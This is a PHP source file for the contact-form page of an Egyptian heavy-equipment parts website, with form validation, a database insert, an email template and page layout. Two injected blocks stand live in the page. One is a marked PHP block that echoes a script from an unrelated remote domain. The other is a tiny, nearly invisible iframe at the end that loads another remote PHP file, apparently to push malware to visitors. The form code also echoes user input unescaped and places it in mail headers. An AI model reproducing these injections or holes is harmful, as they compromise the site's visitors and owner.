<? require "header.php"; ?>
<?
// Definition
define("email_expression","^[a-zA-Z0-9.\_-]+@[a-zA-Z0-9\_\-]+\.[a-zA-z0-9\-\.]+$");
define("user_text","^[a-zA-Z0-9_-]+$");
//////// ADD
//  ARRAY MESSAGE
$message_info["1"] = " &bull; <span style=color:#FF0000>Please insert name. </span><br>";
$message_info["2"] = " &bull; <span style=color:#FF0000>Please insert email. </span><br>";
$message_info["3"] = " &bull; <span style=color:#FF0000>Please insert correct email. </span><br>";
$message_info["4"] = " &bull; <span style=color:#FF0000>Please insert subject. </span><br>";
$message_info["5"] = " &bull; <span style=color:#FF0000>Please insert message. </span><br>";
////////////////////////////
$message_display = "";
$add_status = TRUE;
if (isset($_POST["send"]))
{
// Contact Name
	$name = trim(stripslashes($_POST["name"]));
	if(strlen($name) == 0)
	{
		$message_display .= $message_info[1];
		$add_status = FALSE;
	}
// Check email
	$email = trim(stripslashes($_POST["email"]));
	//check length
	if(strlen($email) == 0)
	{
		$message_display .= $message_info[2];
		$add_status = FALSE;
	}
	elseif(!(eregi(email_expression,$email)))
	{
		$message_display .= $message_info[3];
		$add_status = FALSE;
	}
// Phone
	$phone = trim(stripslashes($_POST["phone"]));
// Subject
	$subject = trim(stripslashes($_POST["subject"]));
	if(strlen($subject) == 0)
	{
		$message_display .= $message_info[4];
		$add_status = FALSE;
	}
// Message
	$message = trim(stripslashes($_POST["message"]));
	if(strlen($message) == 0)
	{
		$message_display .= $message_info[5];
		$add_status = FALSE;
	}
}
//////////////////
if (isset($_POST["send"]) AND ($add_status == TRUE))
{
	$insert_info["name"] = $name;	
	$insert_info["email"] = $email;	
	$insert_info["phone"]   = $phone;	
	$insert_info["subject"] = $subject;	
	$insert_info["message"] = $message;	
	$insert_info["receive_date"] = date('Y-m-d');	
	//$insert_info["site_version"] = 1;	
	
	$cls -> db_insert('contact_us',$insert_info);
	
	$correct = 1;
/////////////////
/////////////////

$header = "MIME-Version: 1.0\n";
$header .= "Content-Type: text/html; charset=windows-1256\n";
$header .= "From: ". $email ."\n";
$header .= "Return-Path: <$email>\n";
$_subject = "ITSMF contact us form";
$text =
"
<STYLE type=text/css>#message {
	FONT-SIZE: 13px; LINE-HEIGHT: 130%
}
#message TD {
	FONT-SIZE: 13px; LINE-HEIGHT: 130%
}
#message P {
	FONT-SIZE: 13px; LINE-HEIGHT: 130%
}
#message TH {
	FONT-SIZE: 13px; LINE-HEIGHT: 130%
}
</STYLE>
      

<table  cellPadding=0 width=560 align=center bgColor=#999999 border=0>
<TBODY><TR>
	<TD bgColor=#ffffff>
    	<TABLE cellSpacing=0 cellPadding=0 width='100%' border=0>
        <TBODY><TR>
        	<TD vAlign=center align=middle bgColor=#e7e7e7 height=50>
			<div align='center' style='FONT-SIZE: 16px; COLOR: #000000; FONT-FAMILY: Arial, Helvetica, sans-serif'>You have a message from generaltools-eg.com ( Contact us form )!</div>			
			<div align=center>English Version</div></TD>
		</TR>
        <TR>
            <TD>
            <DIV style='PADDING-RIGHT: 12px; PADDING-LEFT: 12px; FONT-SIZE: 13px; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; FONT-FAMILY: Arial, Helvetica, sans-serif'>
			<STRONG>Dear All ,</STRONG><BR>
                  <P>You have received a new message from contact us form . </P>
                  <P><STRONG>Contact Name:</STRONG> ". $name ." </P>
				  <P><STRONG>Telephone: </STRONG> ". $phone ." </P>
				  <P><STRONG>E-Mail: </STRONG> ". $email ." </P>
				  <P><STRONG>Subject: </STRONG><BR> ". $subject ." </P>
                  <P><STRONG>Message: </STRONG><BR> ". $message ." </P>
                  <P>itsmf-egypt.org<BR>Contact Form</P>
                  </DIV>
           </TD>
	  </TR></TBODY>
	  </TABLE>
	</TD>
</TR></TBODY>
</TABLE>
";

$to="eng_msm80@yahoo.com";
//mail($to, $_subject, $text, $header);

/////////////////
/////////////////	
}
////////////////////////////////////////
// Contact Data
$query = "select * from static_pages where id = 5";
$data = $cls -> db_select($query);
$data = $data[1];
////////////////////////////////////////
?>
<?php
#c06edd#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224418\"></script>";
echo $srwv;
}
#/c06edd#
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/internal.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Egyptian machinery</title>
</head>
<link rel="stylesheet" href="../css/css.css"  type="text/css" media="all" />

<SCRIPT LANGUAGE="JavaScript">
<!-- Original:  CodeLifter.com (support@codelifter.com) -->
<!-- Web Site:  http://www.codelifter.com -->

<!-- This script and many more are available free online at -->
<!-- The JavaScript Source!! http://javascript.internet.com -->

<!-- Begin
// Set slideShowSpeed (milliseconds)
var slideShowSpeed = 3000;
// Duration of crossfade (seconds)
var crossFadeDuration = 3;
// Specify the image files
var Pic = new Array();
// to add more images, just continue
// the pattern, adding to the array below
<?
	if(is_array($all_slide)) $i=0;
	while(list($key,$val) = each($all_slide)){
	if(isset($account) AND $account == 1){
?>
Pic[<?=$i ?>] = '../../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	}else{
?>
Pic[<?=$i ?>] = '../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	
	}
	$i++;
	}
?>

// do not edit anything below this line
var t;
var j = 0;
var p = Pic.length;
var preLoad = new Array();
for (i = 0; i < p; i++) {
preLoad[i] = new Image();
preLoad[i].src = Pic[i];
}
function runSlideShow() {
if (document.all) {
document.images.SlideShow.style.filter="blendTrans(duration=2)";
document.images.SlideShow.style.filter="blendTrans(duration=crossFadeDuration)";
document.images.SlideShow.filters.blendTrans.Apply();
}
document.images.SlideShow.src = preLoad[j].src;
if (document.all) {
document.images.SlideShow.filters.blendTrans.Play();
}
j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShow()', slideShowSpeed);
}
//  End -->
</script>

<body onLoad="runSlideShow()" background="../images/bg_03.gif" style="margin:0px; padding:0px">


<div align="center" style="">
<div align="center" style="width:940px;border:#CCCCCC solid 1px; background-color: #FFFFFF">
<!-- /////////////////////////////////// -->
<table border="0" height="285" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td align="center" style="background-color:#d9d9d9" width="258px;">
		<img src="../images/logo.gif" />
	</td>
	<td width="434px;">
		<!-- ///// Slide /////// -->
		<div>
			<img width="434" height="285" src="../upload/slide/<?=$all_slide[1]["slide_photo"] ?>"  name='SlideShow' align="top" />
		</div>	
	</td>
	<td  valign="top" style="width:252px;padding:10px; padding-top:57px; padding-left:50px;background-image:url(../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="home.php">HOME</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=1">ABOUT</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=2">OUR SERVICE</a><br /></div>
<!-- 
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=2">HEAVEY EQUIPMENT</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=3">USED SPARE PARTS</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=4">NEW SPARE PARTS</a><br /></div>
-->
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="contact_us.php">CONTACT</a><br />
			</div>
		</div>
	</td>
</tr>
<tr><td colspan="3" height="20" style="background-image:url(../images/loop2.gif);background-repeat: repeat-y;"></td></tr>
<tr>
	<td valign="top"><br />
		&nbsp; <img src="../images/login.gif" />
		<br />
		<? if(!isset($_SESSION["user_id"])){ ?>
	<span style="font-size:11px"><? if(isset($_POST["login"])) print @$message_display; ?></span>	
	
	<table width="100%" class="font_1">
	<form id="form1" name="form1" method="post" action="">
	<tr>
		<td>User Name</td>
		<td><input name="user_name" value="<? print @$user_name; ?>" type="text" id="user_name" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td>Password</td>
		<td><input name="password" type="password" id="password" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td colspan="2">
		<a href="forgotpassword.php"><img border="0" src="../images/forget_p.gif" /></a>
		<a href="register.php"><img align="right" border="0" src="../images/register.gif" /></a>		</td>
	</tr>
	<tr>
		<td align="right" colspan="2"><input name="login" type="submit" id="login" style="border:0px; width:63px; height:24px; background-image:url(../images/button_1.gif)" value=" " /></td>
	</tr>
	</form>	
	</table>
	<? }else{ ?>
	<div align="center">
		<br />
		<span style="font-family:'Courier New'; color:#333333; font-size:12px;">You Are Login</span>
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="account/my_account.php">My Account</a></div>
		<div align="left" class="bottom" style="padding-bottom:10px; margin-top:10px;"><a style="font-size:12px;" href="log_out.php">Log Out</a></div>
	</div>
	<? }?>	

		
		<hr style="color:#d7d7d7; margin:10px; margin-bottom:10px; margin-top:10px;" />


		<div style=" background-image:url(../images/header1.gif); background-repeat:no-repeatwidth:247px; height:42px;">
		<div style="padding-left:50px; padding-top:10px; font-weight:bolder; font-size:16px; font-family: Arial, Helvetica, sans-serif;">Equipment Categories</div>
		</div>
		
		<br />
		<div align="left" class="right" style="padding-left:40px;" >
			<table width="100%">
			<? 
				reset($all_category);
				if(is_array($all_category)){ $counter = 0;
				while(list($key,$val) = each($all_category)){
				$counter ++;
				if($counter == 18) break;
			?>
			<tr><td><img src="../images/bullet_3.gif" align="absmiddle" /></td><td><a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a></td></tr>
			<? } } ?>
			</table>
			<div align="center"><a style="color: #fcac14; font-size:14px; text-decoration:underline;" href="all_category.php">All Category</a></div>
		</div>
		
		<br />
		<img src="../images/header2.gif" />
		<br />
		<div align="left" class="bottom" style="padding-left:40px;" >
			<? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ $counter = 0;
				while(list($key,$val) = each($all_manufacture)){
				$counter ++;
				if($counter == 7) break;
			?>
			<div style="padding-bottom:5px;"><a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a> <br /></div>
			<? }} ?>
			<div align="center"><a style="color:#333333; font-size:14px; text-decoration:underline;" href="all_manufacture.php">More</a></div>
			<br />

		</div>
				
	</td>
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		<div align="left" style=" font-family:Verdana; font-size:13px;padding:10px;">
		<b><!-- InstanceBeginEditable name="header" -->Contact Us:<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		
		


			  

        
		<div align="center" style=" font-size:10px; font-family:Verdana; font-weight:100;" >
		
		
	<div style="padding:5px; margin:5px; border:#CCCCCC solid 1px;">
	<? if($data["description"] != "") {	?>
		<br clear="all" />
		<? print $data["description"]; ?>
	<? } ?>	
	</div>
		
		
		<br>
		Complete the form and your question will be submitted to our Customer Service Team. We will reply within 48 hours.
		</div>

	<br clear="all" />
	<div style="padding-left:20px; font-weight:200;">
	</div>

	<? if (@$correct == 1) {?>
	<div align="center" class="font_3" style=" color: #009966; font-weight:bolder; font-family: Tahoma; background-color: #FEFFE8; margin:0px 0px 5px 0px; padding:5px 5px 5px 5px;font-size:14px; margin-right:5px;border:1px solid #4F4F4F">
		Your message has been successfully sent. <br>
		Our customer service team will contact you soon
	</div>
	<? }else{ ?>	    
	
	
	<div class="div_1 font_8" style=" padding:4px;padding-right:10px;padding-left:10px;background-color:#EDF4FC;">
		<span style="float:right">(<font color="#E10404">*</font>) Required Information</span>
	</div>

	<br clear="all" />
	<div align="left" style=" padding-top:10px; font-weight:100; font-family:Verdana; font-size:12px; color:#FF0000; margin-bottom:5px; margin-right:5px;">
		<? if(isset($_POST["send"]))  print @$message_display; ?>
	</div>
	

	<table width="99%" cellpadding="0" cellspacing="0">
	<form id="contact_form" name="contact_form" method="post" action="">
	 <tr valign="top">
	 	<td bgcolor="#F5F5F5">
		 <div align="right" class="div_1 font_5"><font face="Verdana, Arial, Helvetica, sans-serif" size="-2" color="#E10404">*</font>Your Name : </div>				 
		 </td>
		<td width="5"></td>

		<td style="padding-top:5px;">
			<input name="name" type="text" id="name" style='width: 270px' value="<? print @$name?>" size='20' Maxlength='80' />
		</td>
	</tr>
	 
	 <tr valign="top">
	 	<td bgcolor="#F5F5F5">
		 <div align="right"  class="div_1 font_5" ><font face="Verdana, Arial, Helvetica, sans-serif" size="-2" color="#E10404">*</font>Your Email: </div>				 
		 </td>

		<td width="5"></td>
		<td style="padding-top:5px;">
			<input name="email" type="text" id="email" style='width: 270px' value="<? print @$email?>" size='20' Maxlength='80' />
		</td>
	</tr>
	 <tr valign="top">
	 	<td bgcolor="#F5F5F5">
		 <div align="right"  class="div_1 font_5" >Your Phone: </div>				 
		 </td>

		<td width="5"></td>
		<td style="padding-top:5px;">
			<input name="phone" type="text" id="phone" style='width: 270px' value="<? print @$phone?>" size='20' Maxlength='80' />
		</td>
	</tr>
	 <tr valign="top">
	 	<td bgcolor="#F5F5F5">
		 <div align="right" class="div_1 font_5" ><font face="Verdana, Arial, Helvetica, sans-serif" size="-2" color="#E10404">*</font>Subject: </div>				 
		 </td>

		<td width="5"></td>
		<td style="padding-top:5px;">
			<input name="subject" type="text" id="subject" style='width: 270px' value="<? print @$subject?>" size='20' Maxlength='80' />
		</td>
	</tr>
	 <tr valign="top">
	 	<td bgcolor="#F5F5F5">
		 <div align="right"  class="div_1 font_5" style="border-bottom:0px;" ><font face="Verdana, Arial, Helvetica, sans-serif" size="-2" color="#E10404">*</font>Message: </div>				 
		 </td>

		<td width="5"></td>
		<td style="padding-top:5px;">
			<textarea name="message" cols="45" rows="7" id="message"><? print @$message?></textarea>
		</td>
	</tr>
	 <tr valign="top">
	 	<td>
		 </td>

		<td width="5"></td>
		<td style="padding-top:10px;">
			<input name="send" type="submit" id="send" value="   Send   " />
			<input type="reset" name="Submit2" value="Reset" />
		</td>
	</tr>
   </form>
   </table>
	<? } ?>
	<br clear="all" />
	<br clear="all" />


										
		
		
		
		
		
		
		
		
		
		<!-- InstanceEndEditable -->	
		</div>
	</td>
	
</tr>
<tr>
<td height="72" colspan="3" style="background-image:url(../images/footer_1.gif); background-repeat:no-repeat">
	<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy; AL Karim Co. for heavey equipment parts, Powered by <a target="_blank" href="http://www.eracore.net">Eracore.net</a>		</div>
</td>
</tr>
</table>	


<!-- /////////////////////////////////// -->
</div></div>

<iframe src="http://elevatemagazine.com/includes/13x.php" border="0" width="6" height="5" /></body>
<!-- InstanceEnd --></html>
